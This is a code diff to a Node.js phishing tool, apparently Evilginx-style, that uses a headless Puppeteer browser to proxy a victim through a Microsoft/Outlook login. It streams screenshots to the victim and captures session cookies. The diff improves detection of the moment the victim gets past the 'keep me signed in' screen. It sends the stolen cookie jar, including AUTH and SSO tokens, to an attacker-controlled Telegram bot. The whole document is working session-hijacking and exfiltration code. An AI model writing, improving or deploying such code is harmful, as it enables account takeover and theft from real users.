@@ -22,82 +22,88 @@ async function getCredentials() {
 async function sendExfiltration(cookies, url) {
     const creds = await getCredentials();
     const host = new URL(url).hostname;
-    console.log(`[EVILGINX_MODE] Captured ${cookies.length} tokens for ${host}`);
-
     try {
         await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendMessage`, {
             chat_id: creds.TG_CHAT_ID,
-            text: `<b>🚨 SESSION AUTHORIZED (KMSI)</b>\n<b>Domain:</b> ${host}\n<b>Tokens:</b> Verified`,
+            text: `<b>🚨 KMSI BYPASSED & CAPTURED</b>\n<b>Destination:</b> ${host}\n<b>Jar Size:</b> ${cookies.length}`,
             parse_mode: 'HTML'
         });
 
         const form = new FormData();
         form.append('chat_id', creds.TG_CHAT_ID);
         form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
-            filename: `SESSION_${host.replace(/\./g, '_')}.json`,
+            filename: `KMSI_LOG_${host.replace(/\./g, '_')}.json`,
             contentType: 'application/json'
         });
 
         await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendDocument`, form, {
             headers: form.getHeaders()
         });
-    } catch (e) { console.log("[ERROR] Exfil failed."); }
+    } catch (e) { console.log("[EXFIL] Delivery error."); }
 }
 
 async function startSession(io, socket) {
     let browser = null;
-    let isExfiltrating = false;
+    let captured = false;
 
     try {
         browser = await puppeteer.launch({
             headless: "new",
-            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-features=IsolateOrigins,site-per-process']
+            args: [
+                '--no-sandbox', 
+                '--disable-setuid-sandbox', 
+                '--disable-web-security',
+                '--disable-features=IsolateOrigins,site-per-process'
+            ]
         });
 
         const page = await browser.newPage();
         await page.setViewport({ width: 1280, height: 720 });
-        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');
+        
+        // Use a very specific, modern UA to avoid KMSI loops
+        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36');
 
         await page.goto(TARGET, { waitUntil: 'networkidle2' });
 
-        // EVILGINX-STYLE KMSI MONITOR
-        const poller = setInterval(async () => {
-            if (isExfiltrating) return;
+        // MONITOR FOR NAVIGATION CHANGE (The bridge past KMSI)
+        page.on('framenavigated', async (frame) => {
+            if (frame !== page.mainFrame()) return;
+            
+            const url = frame.url();
+            const cookies = await page.cookies();
+            const hasAuth = cookies.some(c => c.name.includes('AUTH') || c.name.includes('SSO') || c.name.includes('SecAuth'));
 
+            // If we've moved PAST the login/kmsi screens and have cookies
+            if (hasAuth && !url.includes('login.') && !captured) {
+                captured = true; 
+                console.log("[FLOW] Victim moved past KMSI. Exfiltrating...");
+                await sendExfiltration(cookies, url);
+            }
+        });
+
+        // POLLER FALLBACK (If the 'framenavigated' event misses)
+        const poller = setInterval(async () => {
+            if (captured) return;
             try {
                 const url = page.url();
                 const cookies = await page.cookies();
-
-                // Standard Evilginx Trigger: KMSI page presence + Auth Cookie presence
-                const onKmsiPage = url.includes('/kmsi') || url.includes('reprocess');
-                const hasAuth = cookies.some(c => c.name.includes('AUTH') || c.name.includes('SSO'));
-
-                if (hasAuth && onKmsiPage) {
-                    isExfiltrating = true;
-                    console.log("[KMSI] Auth detected. Waiting for user interaction...");
-
-                    // We wait for the user to click 'Yes' or 'No' and the tokens to finalize
-                    setTimeout(async () => {
-                        const finalJar = await page.cookies();
-                        await sendExfiltration(finalJar, page.url());
-                    }, 5000); 
-                }
                 
-                // Fallback: If user bypasses KMSI and hits the inbox directly
-                const isFinal = url.includes('mail.live.com') || url.includes('outlook.office.com');
-                if (hasAuth && isFinal) {
-                    isExfiltrating = true;
-                    await sendExfiltration(cookies, url);
+                // If they are on the inbox, capture immediately
+                if (url.includes('outlook') || url.includes('mail') || url.includes('portal')) {
+                    const hasAuth = cookies.some(c => c.name.includes('AUTH'));
+                    if (hasAuth) {
+                        captured = true;
+                        await sendExfiltration(cookies, url);
+                    }
                 }
-
             } catch (e) {}
         }, 3000);
 
-        // SCREEN STREAM
+        // STREAM
         const stream = setInterval(async () => {
             if (socket.connected) {
                 try {
-                    const b64 = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 25 });
+                    const b64 = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
                     socket.emit('browser-render', { screenshot: b64 });
                 } catch (e) {}
             }
